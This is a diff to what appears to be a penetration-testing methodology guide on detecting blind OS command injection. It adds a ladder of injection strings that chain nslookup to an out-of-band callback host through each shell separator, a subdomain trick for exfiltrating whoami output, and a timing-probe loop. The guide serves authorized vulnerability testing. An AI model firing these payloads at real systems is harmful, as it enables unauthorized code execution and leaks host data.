@@ -26,9 +26,25 @@ RCE = P1 / top-tier. Code execution on the host typically means full read/write 
    - In-band: look for command output (e.g. `id` / `whoami`) appearing in the response.
    - Try each separator: `;`  `|`  `||`  `&`  `&&`  `` ` ` ``  `$( )`  and a literal newline (`%0a`).
 2. Blind (no output reflected):
-   - Time delay: inject `ping -c 10 127.0.0.1` (Unix) / `ping -n 10 127.0.0.1` (Win) or `sleep 10`; confirm the response is delayed by ~that amount. Re-test with a different delay to rule out noise.
-   - OAST (best): trigger a DNS + HTTP callback to your collaborator host with `nslookup <id>.oast.example` or `curl http://<id>.oast.example`. A received DNS/HTTP hit proves execution even with no reflected output.
+   - **OAST is the DEFAULT confirmer — jitter-immune binary proof.** Get a callback host: `interactsh-client -v` (`~/go/bin/interactsh-client`) for a live domain, or zero-install public `oast.fun` / `oast.pro`. Watch for the DNS/HTTP hit. **Prefer DNS (`nslookup`) — DNS egresses far more often than HTTP.**
+
+     Probe ladder (try each separator in both in-context and command-substitution form; `x` = your OAST host):
+     ```
+     ;nslookup x.oast.fun;      |nslookup x.oast.fun      &nslookup x.oast.fun&
+     &&nslookup x.oast.fun      ||nslookup x.oast.fun      %0anslookup x.oast.fun
+     $(nslookup x.oast.fun)     `nslookup x.oast.fun`
+     ```
+     A received DNS hit proves execution. Exfil data into the subdomain: `$(whoami).x.oast.fun`.
+   - Time delay — **FALLBACK ONLY** (when no egress for OAST). `sleep 10` / `ping -c 10 127.0.0.1` (Unix), `ping -n 10 127.0.0.1` (Win). Jitter is noisy, so it REQUIRES a paired zero-delay control repeated 3x — report only if all 3 TRUE-probes are slow AND all 3 control-probes are fast:
+     ```bash
+     for i in 1 2 3; do
+       printf 'true:  '; curl -so/dev/null -w '%{time_total}\n' '<TRUE 10s>'
+       printf 'false: '; curl -so/dev/null -w '%{time_total}\n' '<FALSE 0s>'
+     done
+     # Report only if all 3 true ~10s AND all 3 false <2s
+     ```
    - Output redirection: write `whoami` to a file under the web root and fetch it (e.g. `> /var/www/static/o.txt` then GET `/o.txt`).
+   - NO ping-flood, no destructive commands — `nslookup`/`sleep` only.
 
 ## Exploitation
 - Separators chain your command onto the intended one. Wrapping with leading/trailing separators (e.g. `& injected &`) helps when your input sits mid-command.
